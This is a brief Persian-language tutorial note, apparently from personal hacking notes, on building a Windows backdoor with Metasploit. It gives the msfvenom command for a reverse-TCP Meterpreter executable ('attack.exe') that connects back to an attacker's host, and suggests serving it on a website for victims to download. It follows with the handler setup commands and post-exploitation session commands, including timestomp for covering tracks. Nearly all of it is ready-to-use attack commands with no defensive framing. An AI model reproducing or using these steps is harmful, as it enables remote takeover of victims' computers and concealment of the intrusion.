$\color{#b91646}{\textsf{MSFvenom backdoor}}$
=============================================

برنامه ی metasploit یه مکانیزمی داره برای درست کردن backdoor توی ویندوز

برنامه ی metasploit یک مجموعه ابزار بزرگیه که به ما اجازه میده exploit هایی که از قبل نوشته شده رو اجرا کنیم.

اینجا از ابزار **msfvenom** استفاده می کنیم.


To create payloads “msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.117 LPORT=1234 --format=exe > attack.exe” and then serve it on a website :D
> msfconsole
> db_staus
> use exploit/multi/handler
> set payload windows/meterpreter/reverse_tcp
> set LHOST 192.168.0.117
> set LPORT 1234
> exploit -j -z
RUN
> sessions -i
> sessions -i 1
> cd, ls, pwd, sysinfo, ipconfig, getuid, cat, timestomp, 


